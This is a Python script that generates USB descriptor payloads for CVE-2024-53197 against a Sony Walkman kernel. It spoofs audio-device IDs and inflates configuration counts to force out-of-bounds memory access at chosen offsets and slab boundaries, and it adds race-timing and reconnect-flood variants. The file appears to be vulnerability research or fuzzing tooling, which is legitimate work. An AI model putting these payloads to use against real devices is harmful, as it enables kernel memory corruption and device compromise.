#!/usr/bin/env python3
"""
Extended USB Descriptor Mutations for CVE-2024-53197

Adds additional mutations to reach 500+ total:
- Alternative VID:PID targets
- Timing-based mutations
- Audio class specific mutations
- Cross-boundary mutations

Target: Sony NW-A306 Walkman (kernel 4.19.157)
"""

from dataclasses import dataclass, field
from typing import List, Dict, Any
from enum import Enum
import json


class ExtendedMutationType(Enum):
    """Additional mutation categories"""
    ALT_VID_PID = "alternative_vid_pid"
    TIMING_ATTACK = "timing_attack"
    AUDIO_CLASS = "audio_class_specific"
    CROSS_BOUNDARY = "cross_boundary"
    RATE_FLOODING = "rate_flooding"
    STRING_OVERFLOW = "string_overflow"


@dataclass
class ExtendedMutation:
    """Extended mutation template"""
    id: str
    name: str
    mutation_type: str
    target_quirk: str
    description: str
    severity: str
    expected_impact: str
    device_descriptor: Dict[str, Any]
    config_descriptor: Dict[str, Any]
    pre_quirk_descriptor: Dict[str, Any] = None
    post_quirk_descriptor: Dict[str, Any] = None
    timing_params: Dict[str, Any] = None
    audio_class_data: Dict[str, Any] = None

    def to_dict(self) -> Dict[str, Any]:
        d = {
            "id": self.id,
            "name": self.name,
            "mutation_type": self.mutation_type,
            "target_quirk": self.target_quirk,
            "description": self.description,
            "severity": self.severity,
            "expected_impact": self.expected_impact,
            "device_descriptor": self.device_descriptor,
            "config_descriptor": self.config_descriptor,
        }
        if self.pre_quirk_descriptor:
            d["pre_quirk_descriptor"] = self.pre_quirk_descriptor
        if self.post_quirk_descriptor:
            d["post_quirk_descriptor"] = self.post_quirk_descriptor
        if self.timing_params:
            d["timing_params"] = self.timing_params
        if self.audio_class_data:
            d["audio_class_data"] = self.audio_class_data
        return d


class ExtendedMutationGenerator:
    """Generate additional mutations to reach 500+ total"""

    # Additional USB Audio devices with boot quirks
    ADDITIONAL_TARGETS = [
        # VID, PID, Name, Quirk type
        (0x0dba, 0x3000, "Digidesign Mbox2", "mbox2"),
        (0x0763, 0x2003, "M-Audio AudioPhile USB", "audiophile"),
        (0x0763, 0x2001, "M-Audio Quattro", "quattro"),
        (0x0763, 0x2024, "M-Audio Fast Track C600", "fasttrack_c600"),
        (0x0763, 0x2080, "M-Audio Fast Track Ultra", "fasttrack_ultra"),
        (0x0763, 0x2081, "M-Audio Fast Track Ultra 8R", "fasttrack_ultra_8r"),
        (0x041e, 0x3010, "Creative SB Audigy 2 NX", "audigy2nx"),
        (0x041e, 0x3020, "Creative Sound Blaster Live! 24-bit", "live24bit"),
        (0x041e, 0x3040, "Creative E-Mu 0202", "emu0202"),
        (0x041e, 0x3048, "Creative E-Mu 0404", "emu0404"),
    ]

    # Extigy firmware sizes
    EXTIGY_FW_OLD = 794
    EXTIGY_FW_NEW = 483

    def __init__(self, start_id: int = 1000):
        self.mutations: List[ExtendedMutation] = []
        self.mutation_id = start_id

    def _next_id(self) -> str:
        self.mutation_id += 1
        return f"EXT-{self.mutation_id:04d}"

    def generate_all(self) -> List[ExtendedMutation]:
        """Generate all extended mutations"""
        self._generate_alt_vid_pid_mutations()
        self._generate_timing_mutations()
        self._generate_audio_class_mutations()
        self._generate_cross_boundary_mutations()
        self._generate_rate_flood_mutations()
        self._generate_string_overflow_mutations()
        return self.mutations

    def _generate_alt_vid_pid_mutations(self):
        """Generate mutations for alternative USB Audio devices"""

        # Test each alternative target with key bNumConfigurations values
        bnum_values = [2, 16, 64, 128, 192, 255]

        for vid, pid, name, quirk in self.ADDITIONAL_TARGETS:
            for bnum in bnum_values:
                oob_bytes = (bnum - 1) * 272

                pre_desc = {
                    "bLength": 18,
                    "bDescriptorType": 1,
                    "bcdUSB": "0x0200",
                    "bDeviceClass": 0,
                    "bDeviceSubClass": 0,
                    "bDeviceProtocol": 0,
                    "bMaxPacketSize0": 64,
                    "idVendor": f"0x{vid:04x}",
                    "idProduct": f"0x{pid:04x}",
                    "bcdDevice": "0x0100",
                    "iManufacturer": 1,
                    "iProduct": 2,
                    "iSerialNumber": 3,
                    "bNumConfigurations": 1
                }

                post_desc = pre_desc.copy()
                post_desc["bNumConfigurations"] = bnum

                config = {
                    "bLength": 9,
                    "bDescriptorType": 2,
                    "wTotalLength": self.EXTIGY_FW_OLD,
                    "bNumInterfaces": 1,
                    "bConfigurationValue": 1,
                    "iConfiguration": 0,
                    "bmAttributes": "0xc0",
                    "bMaxPower": 250
                }

                if oob_bytes > 4096:
                    severity = "critical"
                    impact = f"Massive OOB ({oob_bytes} bytes) on {name}"
                elif oob_bytes > 1024:
                    severity = "high"
                    impact = f"Significant OOB ({oob_bytes} bytes) on {name}"
                else:
                    severity = "medium"
                    impact = f"Controlled OOB ({oob_bytes} bytes) on {name}"

                mutation = ExtendedMutation(
                    id=self._next_id(),
                    name=f"{quirk}_bnum_{bnum}",
                    mutation_type=ExtendedMutationType.ALT_VID_PID.value,
                    target_quirk=quirk,
                    description=f"{name}: bNumConfigurations 1 -> {bnum}",
                    severity=severity,
                    expected_impact=impact,
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc
                )

                self.mutations.append(mutation)

    def _generate_timing_mutations(self):
        """Generate timing-based mutations

        Test different delays between enumeration phases
        to affect race conditions in kernel
        """

        delays = [
            0,      # No delay
            1,      # 1ms
            10,     # 10ms
            50,     # 50ms
            100,    # 100ms
            500,    # 500ms
            1000,   # 1s
            2000,   # 2s
            5000,   # 5s
        ]

        for delay in delays:
            for bnum in [128, 192, 255]:
                pre_desc = {
                    "bLength": 18,
                    "bDescriptorType": 1,
                    "idVendor": "0x041e",
                    "idProduct": "0x3000",
                    "bNumConfigurations": 1
                }

                post_desc = pre_desc.copy()
                post_desc["bNumConfigurations"] = bnum

                config = {
                    "wTotalLength": self.EXTIGY_FW_OLD
                }

                timing_params = {
                    "pre_quirk_delay_ms": 0,
                    "post_quirk_delay_ms": delay,
                    "descriptor_response_delay_ms": delay // 2
                }

                mutation = ExtendedMutation(
                    id=self._next_id(),
                    name=f"timing_{delay}ms_bnum_{bnum}",
                    mutation_type=ExtendedMutationType.TIMING_ATTACK.value,
                    target_quirk="extigy",
                    description=f"Delay {delay}ms after boot quirk, bNumConfigurations={bnum}",
                    severity="high",
                    expected_impact=f"Race condition timing with {delay}ms delay",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc,
                    timing_params=timing_params
                )

                self.mutations.append(mutation)

    def _generate_audio_class_mutations(self):
        """Generate USB Audio Class specific mutations

        Target UAC descriptors that affect parsing in sound/usb/
        """

        # Audio Control Interface Header variations
        bcdADC_values = [0x0100, 0x0200, 0x0300, 0xFFFF]
        wTotalLength_values = [0, 9, 64, 256, 1024, 65535]
        bInCollection_values = [0, 1, 2, 16, 255]

        for bcdADC in bcdADC_values:
            for bInCollection in bInCollection_values:
                pre_desc = {
                    "idVendor": "0x041e",
                    "idProduct": "0x3000",
                    "bNumConfigurations": 1
                }

                config = {
                    "wTotalLength": self.EXTIGY_FW_OLD
                }

                audio_data = {
                    "bcdADC": f"0x{bcdADC:04x}",
                    "bInCollection": bInCollection,
                    "audio_interfaces": list(range(bInCollection))
                }

                severity = "high" if bInCollection > 16 or bcdADC > 0x0200 else "medium"

                mutation = ExtendedMutation(
                    id=self._next_id(),
                    name=f"uac_bcdADC_{bcdADC:04x}_coll_{bInCollection}",
                    mutation_type=ExtendedMutationType.AUDIO_CLASS.value,
                    target_quirk="extigy",
                    description=f"UAC: bcdADC=0x{bcdADC:04x}, bInCollection={bInCollection}",
                    severity=severity,
                    expected_impact="Audio class parsing may overflow or fail",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    audio_class_data=audio_data
                )

                self.mutations.append(mutation)

        # Audio Streaming Interface mutations
        # Test bTerminalLink, bDelay, wFormatTag
        for wFormatTag in [0, 1, 2, 255, 65535]:
            for bDelay in [0, 1, 255]:
                pre_desc = {
                    "idVendor": "0x041e",
                    "idProduct": "0x3000",
                    "bNumConfigurations": 1
                }

                config = {
                    "wTotalLength": self.EXTIGY_FW_OLD
                }

                audio_data = {
                    "wFormatTag": wFormatTag,
                    "bDelay": bDelay,
                    "bTerminalLink": 1
                }

                mutation = ExtendedMutation(
                    id=self._next_id(),
                    name=f"uac_stream_fmt_{wFormatTag}_delay_{bDelay}",
                    mutation_type=ExtendedMutationType.AUDIO_CLASS.value,
                    target_quirk="extigy",
                    description=f"Audio stream: wFormatTag={wFormatTag}, bDelay={bDelay}",
                    severity="medium",
                    expected_impact="Audio format parsing edge cases",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    audio_class_data=audio_data
                )

                self.mutations.append(mutation)

        # Sample rate mutations
        sample_rates = [0, 8000, 44100, 48000, 96000, 192000, 0xFFFFFF]
        for rate in sample_rates:
            pre_desc = {
                "idVendor": "0x041e",
                "idProduct": "0x3000",
                "bNumConfigurations": 1
            }

            config = {
                "wTotalLength": self.EXTIGY_FW_OLD
            }

            audio_data = {
                "bSamFreqType": 1,  # Discrete
                "tSamFreq": [rate]
            }

            mutation = ExtendedMutation(
                id=self._next_id(),
                name=f"uac_samplerate_{rate}",
                mutation_type=ExtendedMutationType.AUDIO_CLASS.value,
                target_quirk="extigy",
                description=f"Audio sample rate: {rate} Hz",
                severity="low" if 8000 <= rate <= 192000 else "medium",
                expected_impact="Sample rate handling edge case",
                device_descriptor=pre_desc,
                config_descriptor=config,
                audio_class_data=audio_data
            )

            self.mutations.append(mutation)

    def _generate_cross_boundary_mutations(self):
        """Generate mutations that cross memory boundaries

        Target specific OOB sizes to hit page boundaries, slab boundaries
        """

        # Interesting boundary sizes (bytes from config array start)
        # usb_host_config = 272 bytes on ARM64
        boundaries = [
            (4096, "page_boundary"),       # Page boundary
            (8192, "double_page"),         # 2 pages
            (16384, "quad_page"),          # 4 pages
            (32768, "8_page"),             # 8 pages
            (65536, "16_page"),            # 16 pages
            (256, "slab_256"),             # kmalloc-256 slab
            (512, "slab_512"),             # kmalloc-512 slab
            (1024, "slab_1k"),             # kmalloc-1024 slab
            (2048, "slab_2k"),             # kmalloc-2048 slab
            (4096, "slab_4k"),             # kmalloc-4096 slab
        ]

        for target_size, name in boundaries:
            # Calculate bNumConfigurations needed
            # OOB = (bnum - 1) * 272
            # bnum = (OOB / 272) + 1
            bnum = (target_size // 272) + 1
            bnum = min(255, bnum)  # Cap at max

            actual_oob = (bnum - 1) * 272

            pre_desc = {
                "idVendor": "0x041e",
                "idProduct": "0x3000",
                "bNumConfigurations": 1
            }

            post_desc = pre_desc.copy()
            post_desc["bNumConfigurations"] = bnum

            config = {
                "wTotalLength": self.EXTIGY_FW_OLD
            }

            mutation = ExtendedMutation(
                id=self._next_id(),
                name=f"boundary_{name}",
                mutation_type=ExtendedMutationType.CROSS_BOUNDARY.value,
                target_quirk="extigy",
                description=f"Target {name} ({target_size} bytes), bnum={bnum}, actual OOB={actual_oob}",
                severity="critical" if target_size >= 4096 else "high",
                expected_impact=f"Cross {name} - likely crash at boundary",
                device_descriptor=pre_desc,
                config_descriptor=config,
                pre_quirk_descriptor=pre_desc,
                post_quirk_descriptor=post_desc
            )

            self.mutations.append(mutation)

        # Generate exact offset mutations
        # Target specific offsets within corrupted region
        for offset in [272, 544, 816, 1088, 1360, 1632, 1904, 2176, 2448, 2720]:
            bnum = (offset // 272) + 2  # +2 to ensure we reach that offset

            pre_desc = {
                "idVendor": "0x041e",
                "idProduct": "0x3000",
                "bNumConfigurations": 1
            }

            post_desc = pre_desc.copy()
            post_desc["bNumConfigurations"] = bnum

            config = {
                "wTotalLength": self.EXTIGY_FW_OLD
            }

            mutation = ExtendedMutation(
                id=self._next_id(),
                name=f"exact_offset_{offset}",
                mutation_type=ExtendedMutationType.CROSS_BOUNDARY.value,
                target_quirk="extigy",
                description=f"Target exact offset +{offset} bytes",
                severity="high",
                expected_impact=f"Corrupt memory at offset +{offset}",
                device_descriptor=pre_desc,
                config_descriptor=config,
                pre_quirk_descriptor=pre_desc,
                post_quirk_descriptor=post_desc
            )

            self.mutations.append(mutation)

    def _generate_rate_flood_mutations(self):
        """Generate rate-flooding mutations

        Test kernel handling of rapid descriptor changes
        """

        flood_rates = [1, 5, 10, 50, 100]  # Reconnections per second
        burst_sizes = [1, 3, 5, 10]        # Rapid reconnects per burst

        for rate in flood_rates:
            for burst in burst_sizes:
                for bnum in [64, 128, 255]:
                    pre_desc = {
                        "idVendor": "0x041e",
                        "idProduct": "0x3000",
                        "bNumConfigurations": 1
                    }

                    post_desc = pre_desc.copy()
                    post_desc["bNumConfigurations"] = bnum

                    config = {
                        "wTotalLength": self.EXTIGY_FW_OLD
                    }

                    timing_params = {
                        "reconnect_rate_hz": rate,
                        "burst_size": burst,
                        "inter_burst_delay_ms": 1000 // rate if rate > 0 else 1000
                    }

                    mutation = ExtendedMutation(
                        id=self._next_id(),
                        name=f"flood_{rate}hz_burst_{burst}_bnum_{bnum}",
                        mutation_type=ExtendedMutationType.RATE_FLOODING.value,
                        target_quirk="extigy",
                        description=f"Flood: {rate} Hz, burst {burst}, bnum={bnum}",
                        severity="high",
                        expected_impact=f"Race conditions from rapid reconnects",
                        device_descriptor=pre_desc,
                        config_descriptor=config,
                        pre_quirk_descriptor=pre_desc,
                        post_quirk_descriptor=post_desc,
                        timing_params=timing_params
                    )

                    self.mutations.append(mutation)

    def _generate_string_overflow_mutations(self):
        """Generate USB string descriptor overflow mutations

        Test kernel handling of oversized or malformed strings
        """

        string_lengths = [0, 1, 126, 127, 128, 254, 255, 256, 512, 1024]

        for length in string_lengths:
            pre_desc = {
                "idVendor": "0x041e",
                "idProduct": "0x3000",
                "bNumConfigurations": 1,
                "iManufacturer": 1,
                "iProduct": 2,
                "iSerialNumber": 3
            }

            config = {
                "wTotalLength": self.EXTIGY_FW_OLD
            }

            # Generate test string
            test_string = "A" * min(length, 1024)

            mutation = ExtendedMutation(
                id=self._next_id(),
                name=f"string_len_{length}",
                mutation_type=ExtendedMutationType.STRING_OVERFLOW.value,
                target_quirk="extigy",
                description=f"String descriptor length: {length} bytes",
                severity="high" if length > 255 else "medium",
                expected_impact=f"String parsing with {length} byte descriptor",
                device_descriptor=pre_desc,
                config_descriptor=config,
                audio_class_data={
                    "manufacturer_string": test_string[:length//3] if length > 0 else "",
                    "product_string": test_string[:length//3] if length > 0 else "",
                    "serial_string": test_string[:length//3] if length > 0 else ""
                }
            )

            self.mutations.append(mutation)

        # NULL byte injection
        null_positions = [0, 1, 10, 50, 100]
        for pos in null_positions:
            pre_desc = {
                "idVendor": "0x041e",
                "idProduct": "0x3000",
                "bNumConfigurations": 1
            }

            config = {
                "wTotalLength": self.EXTIGY_FW_OLD
            }

            mutation = ExtendedMutation(
                id=self._next_id(),
                name=f"string_null_at_{pos}",
                mutation_type=ExtendedMutationType.STRING_OVERFLOW.value,
                target_quirk="extigy",
                description=f"NULL byte at position {pos} in string",
                severity="medium",
                expected_impact="String truncation/parsing error",
                device_descriptor=pre_desc,
                config_descriptor=config,
                audio_class_data={
                    "null_position": pos
                }
            )

            self.mutations.append(mutation)

    def export_json(self, filepath: str):
        """Export mutations to JSON"""
        data = {
            "metadata": {
                "generator": "Extended USB Descriptor Mutation Generator",
                "target": "Sony NW-A306 Walkman (kernel 4.19.157)",
                "total_mutations": len(self.mutations),
                "categories": {}
            },
            "mutations": [m.to_dict() for m in self.mutations]
        }

        # Count by type
        for mt in ExtendedMutationType:
            count = sum(1 for m in self.mutations if m.mutation_type == mt.value)
            data["metadata"]["categories"][mt.value] = count

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

    def merge_with_base(self, base_filepath: str, output_filepath: str):
        """Merge extended mutations with base mutations"""
        # Load base mutations
        with open(base_filepath, 'r') as f:
            base_data = json.load(f)

        # Add extended mutations
        extended_mutations = [m.to_dict() for m in self.mutations]
        base_data["mutations"].extend(extended_mutations)

        # Update metadata
        base_data["metadata"]["total_mutations"] = len(base_data["mutations"])

        # Add extended categories
        for mt in ExtendedMutationType:
            count = sum(1 for m in self.mutations if m.mutation_type == mt.value)
            base_data["metadata"]["categories"][mt.value] = count

        with open(output_filepath, 'w') as f:
            json.dump(base_data, f, indent=2)


def main():
    """Generate extended mutations and merge with base"""
    print("=" * 70)
    print("Extended USB Descriptor Mutation Generator")
    print("Target: CVE-2024-53197 / Sony NW-A306 Walkman")
    print("=" * 70)
    print()

    generator = ExtendedMutationGenerator(start_id=1000)
    mutations = generator.generate_all()

    print(f"Generated {len(mutations)} extended mutations")
    print()

    # Count by type
    type_counts = {}
    for mt in ExtendedMutationType:
        count = sum(1 for m in mutations if m.mutation_type == mt.value)
        type_counts[mt.value] = count
        print(f"  {mt.value}: {count}")

    print()

    # Export standalone
    generator.export_json("extended_mutations.json")
    print("Exported to extended_mutations.json")

    # Merge with base if available
    try:
        generator.merge_with_base("descriptor_mutations.json", "all_mutations.json")
        print("Merged to all_mutations.json")

        # Count total
        with open("all_mutations.json", 'r') as f:
            data = json.load(f)
            print(f"\nTotal mutations: {len(data['mutations'])}")
    except FileNotFoundError:
        print("Base mutations file not found, skipping merge")


if __name__ == "__main__":
    main()
